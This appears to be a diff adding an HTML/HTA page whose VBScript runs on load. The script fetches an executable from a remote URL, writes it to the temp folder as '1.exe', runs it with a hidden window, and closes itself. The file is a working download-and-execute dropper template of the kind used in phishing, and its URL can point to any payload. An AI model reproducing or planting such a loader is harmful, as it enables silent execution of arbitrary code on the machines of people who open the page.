@@ -1,0 +1,65 @@
+<HTML> 
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+
+<script language="VBScript">
+
+	 url = "https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe" 
+   
+   
+Set req=CreateObject("WinHTTP.WinHTTPRequest.5.1")
+req.SetProxy 0
+req.Open "GET",url,0
+req.Send
+If 200=req.status Then
+
+
+
+
+
+	filename = "1.exe"
+	
+		
+
+  Set c=CreateObject("Scripting.FileSystemObject")
+  tempFolder =c.GetSpecialFolder(2)
+
+  
+  fullPath=c.BuildPath( tempFolder, filename)
+  Set stream=CreateObject("ADODB.Stream")
+  stream.Open
+  stream.Type=1
+  stream.Write req.responseBody
+ 
+  
+  	slen= stream.Size
+	stream.position=0
+	redim rc(slen)
+	strKey = CLng(keyRand)
+	For i=0 To slen-1
+		rc(i)= Chr(CByte(AscB(stream.Read(1)) ))
+	Next
+	Dim rctxt: rctxt = join(rc,"")
+  Set c=CreateObject("Scripting.FileSystemObject")
+  Set b=c.CreateTextFile(fullPath)
+  b.Write rctxt
+  b.Close
+  stream.Close
+
+Set objShell = CreateObject("Wscript.Shell")
+fullCmdRun = cmdRun & fullPath
+objShell.Run fullCmdRun , 0 , true
+
+
+ 
+End If
+
+
+	window.close
+
+</script>
+<body>
+
+</body>
+</HEAD>
+
+</HTML> 
